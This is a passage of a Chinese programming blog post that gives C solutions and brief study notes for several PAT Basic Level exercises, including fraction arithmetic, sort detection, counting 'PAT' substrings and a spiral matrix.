b1 = b, c = <span class="number">0</span>, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(a1 &lt; <span class="number">0</span>)</span><br><span class="line">a1 *= <span class="number">-1</span>, a *= <span class="number">-1</span>, flag *= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)</span><br><span class="line">b1 *= <span class="number">-1</span>, b *= <span class="number">-1</span>, flag *= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(b1)</span><br><span class="line">&#123;</span><br><span class="line">c = a1%b1;</span><br><span class="line">a1 = b1;</span><br><span class="line">b1 = c;</span><br><span class="line">&#125;</span><br><span class="line">a /= a1, b /= a1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(-"</span>);</span><br><span class="line"><span class="keyword">if</span>(a/b &amp;&amp; a%b)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld %ld/%ld"</span>, a/b, a%b, b);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a%b)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld/%ld"</span>, a%b, b);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld"</span>, a/b);</span><br><span class="line"><span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">")"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> op[<span class="number">5</span>] = <span class="string">"+-*/"</span>, i = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">long</span> a1 = <span class="number">0</span>, a2 = <span class="number">0</span>, b1 = <span class="number">0</span>, b2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%ld/%ld %ld/%ld"</span>, &amp;a1, &amp;a2, &amp;b1, &amp;b2);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gcd(a1, a2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %c "</span>, op[i]);</span><br><span class="line">gcd(b1, b2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" = "</span>);</span><br><span class="line"><span class="keyword">switch</span> (op[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'+'</span>: gcd(a1*b2+a2*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'-'</span>: gcd(a1*b2-a2*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'*'</span>: gcd(a1*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/'</span>: gcd(a1*b2, a2*b1);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šåˆ†æ•°åŠ å‡æ³•ä¸è¾“å‡ºæ ¼å¼çš„å­¦ä¹ ã€‚</strong></p><h3 id="1035-æ’å…¥ä¸å½’å¹¶"><a href="#1035-æ’å…¥ä¸å½’å¹¶" class="headerlink" title="1035 æ’å…¥ä¸å½’å¹¶"></a>1035 æ’å…¥ä¸å½’å¹¶</h3><p>å…³é”®åœ¨äºäº†è§£æ’å…¥ä¸å½’å¹¶æ’åºçš„åŸç†ï¼Œç„¶å<strong>ä½¿ç”¨qsortæ¥æ¨¡æ‹Ÿä¸¤ç§æ’åºç®—æ³•</strong>ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200719110816354.png" alt="image-20200719110816354"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, flag = <span class="number">1</span>, k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, b+i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n<span class="number">-1</span> &amp;&amp; b[i] &lt;= b[i+<span class="number">1</span>]; i++);</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="number">1</span>; a[j] == b[j] &amp;&amp; j &lt; n; j++);</span><br><span class="line"><span class="keyword">if</span>(j == n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Insertion Sort"</span>);</span><br><span class="line">qsort(a, i+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Merge Sort"</span>);</span><br><span class="line"><span class="keyword">while</span>(flag)</span><br><span class="line">&#123;</span><br><span class="line">k *= <span class="number">2</span>;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i] != b[i])</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n/k; i++) <span class="comment">//ä¸€æ¬¡å½’å¹¶æ’åºæ¨¡æ‹Ÿï¼Œæ³¨æ„å¥‡æ•°ä¸ªæ•°çš„æƒ…å†µ</span></span><br><span class="line">qsort(a+k*i, k, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">qsort(a+n/k*k, n-(n/k*k), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šæ’åºç®—æ³•çš„äº†è§£ä¸qsortçš„è¿ç”¨ã€‚</strong></p><h3 id="1040-æœ‰å‡ ä¸ªPAT"><a href="#1040-æœ‰å‡ ä¸ªPAT" class="headerlink" title="1040 æœ‰å‡ ä¸ªPAT"></a>1040 æœ‰å‡ ä¸ªPAT</h3><p>åšè¿™ä¸ªçš„é¢˜çš„æ€è·¯çœŸæ˜¯ç§’å•Šï¼Œæœç„¶å¥½æƒ³çš„æ–¹æ³•å†™èµ·æ¥å¤šï¼Œä¸å®¹æ˜“æƒ³åˆ°çš„æ–¹æ³•ä»£ç é‡åˆå°‘æ•ˆç‡åˆé«˜ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200720095208134.png" alt="image-20200720095208134"></p><p><strong>å…ˆç»Ÿè®¡æ‰€æœ‰â€™Tâ€™çš„ä¸ªæ•°ï¼Œå†ä¾æ¬¡éå†ã€‚å¦‚æœåœ¨å‰é¢é‡åˆ°çš„â€™Pâ€™åˆ™Pçš„ä¸ªæ•°åŠ 1ï¼Œé‡åˆ°â€™Tâ€™åˆ™Tçš„ä¸ªæ•°å‡ä¸€ï¼Œé‡åˆ°â€™Aâ€™åˆ™æ€»ä¸ªæ•°ç›´æ¥åŠ ä¸Šæ­¤æ—¶Pçš„ä¸ªæ•°ä¸Tçš„ä¸ªæ•°ä¹˜ç§¯ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> ans = <span class="number">0</span>, <span class="keyword">count_t</span> = <span class="number">0</span>, count_p = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)</span><br><span class="line"><span class="keyword">count_t</span>++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'P'</span>)</span><br><span class="line">count_p++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)</span><br><span class="line"><span class="keyword">count_t</span>--;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ans += count_p*<span class="keyword">count_t</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans%<span class="number">1000000007</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1041-è€ƒè¯•åº§ä½å·"><a href="#1041-è€ƒè¯•åº§ä½å·" class="headerlink" title="1041 è€ƒè¯•åº§ä½å·"></a>1041 è€ƒè¯•åº§ä½å·</h3><p>ä»è¿™é“é¢˜æ‰¾å‡ºäº†ä»¥å‰ä¸æ¸…æ¥šçš„çŸ¥è¯†ç‚¹ã€‚</p><blockquote><p>scanf()ï¼›åå¦‚æœæ˜¯æ˜¯ç”¨gets()è¾“å…¥å­—ç¬¦ä¸²ï¼Œé‚£å¿…é¡»å…ˆåƒæ‰å›è½¦ï¼›å¦‚æœæ˜¯ç”¨scanf(â€œ%sâ€, )ï¼›è¾“å…¥å­—ç¬¦ä¸²å¯ä»¥ä¸åƒæ‰å›è½¦ã€‚</p></blockquote><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200721104703255.png" alt="image-20200721104703255"></p><p>æˆåŠŸè·³è¿›ä¸Šå›¾æ ‡å‡ºçš„å‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> id[<span class="number">17</span>]; </span><br><span class="line"><span class="keyword">int</span> z2;</span><br><span class="line">&#125;People;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> id_[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, z1_ = <span class="number">0</span>, z2_ = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line">People people[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>, id_, &amp;z1_, &amp;z2_);</span><br><span class="line"><span class="built_in">strcpy</span>(people[z1_].id, id_);</span><br><span class="line">people[z1_].z2 = z2_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;temp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d\n"</span>, people[temp].id, people[temp].z2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1045-å¿«é€Ÿæ’åº"><a href="#1045-å¿«é€Ÿæ’åº" class="headerlink" title="1045 å¿«é€Ÿæ’åº"></a>1045 å¿«é€Ÿæ’åº</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200726184818322.png" alt="image-20200726184818322"></p><p>è¿™ä¸ªé¢˜å…³é”®åœ¨äºä¸€ä¸ªç‚¹ï¼šåªè¦æŸä¸ªå…ƒç´ çš„ä½ç½®æ²¡æœ‰å˜ï¼Œæˆ‘ä»¬åªè¦ä¿è¯å·¦è¾¹çš„å…ƒç´ æœ€å¤§å€¼éƒ½æ¯”å®ƒå°ï¼Œé‚£è¯¥å…ƒç´ å·¦è¾¹çš„å…ƒç´ éƒ½æ¯”å®ƒå°ï¼Œå³è¾¹çš„å…ƒç´ éƒ½æ¯”å®ƒå¤§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, i = <span class="number">0</span>, count = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">100001</span>], p1[<span class="number">100001</span>], p2[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p[i]);</span><br><span class="line">p1[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">qsort(p, N, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p[i] == p1[i] &amp;&amp; p1[i] &gt; <span class="built_in">max</span>)</span><br><span class="line">            p2[count++] = p[i];</span><br><span class="line">        <span class="keyword">if</span>(p1[i] &gt; <span class="built_in">max</span>)</span><br><span class="line">            <span class="built_in">max</span> = p1[i];</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line">    <span class="keyword">if</span>(count)</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"%d"</span>, p2[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %d"</span>, p2[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1048-æ•°å­—åŠ å¯†"><a href="#1048-æ•°å­—åŠ å¯†" class="headerlink" title="1048 æ•°å­—åŠ å¯†"></a>1048 æ•°å­—åŠ å¯†</h3><p>é¢˜ç›®ä¸éš¾åˆæ˜¯å‘äººçš„éšå«æ¡ä»¶ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200727112844292.png" alt="image-20200727112844292"></p><p>è¿™é‡Œè¯´2ä¸ªæ•´æ•°æ¯ä¸€ä½å¯¹åº”æ•°å­—è¿›è¡Œè¿ç®—ï¼Œä½†æœ‰ä¸ªæƒ…å†µå°±æ˜¯Bçš„é•¿åº¦å°äºAçš„é•¿åº¦çš„æ—¶å€™å°±è¦åœ¨Bçš„å‰é¢ç”¨â€™0â€™è¡¥é½ä¸Aä¸€æ ·çš„é•¿åº¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l_a = <span class="number">0</span>, l_b = <span class="number">0</span>, i = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">14</span>] = <span class="string">"0123456789JQK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %s"</span>, a, b);</span><br><span class="line">l_a = <span class="built_in">strlen</span>(a), l_b = <span class="built_in">strlen</span>(b);</span><br><span class="line"><span class="keyword">if</span>(l_b &lt; l_a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(i &lt; l_a-l_b)</span><br><span class="line">c[i++] = <span class="string">'0'</span>;</span><br><span class="line"><span class="built_in">strcat</span>(c, b);</span><br><span class="line"><span class="built_in">strcpy</span>(b, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span>, l_b = <span class="built_in">strlen</span>(b);</span><br><span class="line"><span class="keyword">while</span>(i &lt;= l_a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>)</span><br><span class="line">b[l_b-i] = s[(b[l_b-i]<span class="number">-48</span>+a[l_a-i]<span class="number">-48</span>)%<span class="number">13</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = (b[l_b-i]<span class="number">-48</span>)-(a[l_a-i]<span class="number">-48</span>);</span><br><span class="line">b[l_b-i] = temp &lt; <span class="number">0</span> ? temp+<span class="number">10</span>+<span class="number">48</span>:temp+<span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1049-æ•°åˆ—çš„ç‰‡æ®µå’Œ"><a href="#1049-æ•°åˆ—çš„ç‰‡æ®µå’Œ" class="headerlink" title="1049 æ•°åˆ—çš„ç‰‡æ®µå’Œ"></a>1049 æ•°åˆ—çš„ç‰‡æ®µå’Œ</h3><p>ä¸ä¼šåŠ¨æ€è§„åˆ’ï¼Œç®—æ³•æ²¡æœ‰å­¦ä¹ è¿‡ï¼Œåšè¿™ä¸ªé¢˜çœ‹äº†æŸ³ç¥çš„ç®—æ³•ï¼Œå‰å®³ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200728144302045.png" alt="image-20200728144302045"></p><p><strong>ç®—æ³•ï¼šç®—å‡ºæ¯ä¸ªæ•°ä¸€å…±ä¼šåœ¨ç‰‡æ®µä¸­å‡ºç°çš„æ¬¡æ•°ï¼Œç„¶åç›¸ä¹˜ã€‚æœ€åæ‰€æœ‰æ•°æ®ç›¸åŠ å³å¯ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">double</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;temp);</span><br><span class="line">ans += (<span class="keyword">long</span> <span class="keyword">long</span>)(temp*<span class="number">1000</span>)*i*(n-i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans/<span class="number">1000.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1050-èºæ—‹çŸ©é˜µ"><a href="#1050-èºæ—‹çŸ©é˜µ" class="headerlink" title="1050 èºæ—‹çŸ©é˜µ"></a>1050 èºæ—‹çŸ©é˜µ</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200729112529823.png" alt="image-20200729112529823"></p><p><strong>å¼€å§‹æƒ³çš„æ˜¯ä»å¤–å±‚ä¸€åœˆä¸€åœˆçš„å¡«å……ï¼Œä½†æ˜¯æœ€åä¹Ÿåªèƒ½å¡«å……æœ€å¤–å±‚ï¼Œå†…å±‚å¡«å……ä¸å¥½æ’è¿›å»ã€‚ã€‚ã€‚</strong></p><p><strong>ä¸‹é¢æ˜¯<a href="https://www.liuchuo.net/" target="_blank" rel="noopener">æŸ³å©¼ ã®  blog</a>çš„å¡«å……æ–¹æ³•ç»™å‡ºçš„å›¾ï¼šçœŸçš„æ¸…æ™°æ˜äº†ã€‚å…¶å®è¿™ä¹Ÿæ˜¯æœ€åŸºæœ¬åº”è¯¥æƒ³åˆ°çš„å¸¸è§„æ–¹æ³•ã€‚</strong></p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200729112504588.png" alt="image-20200729112504588"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 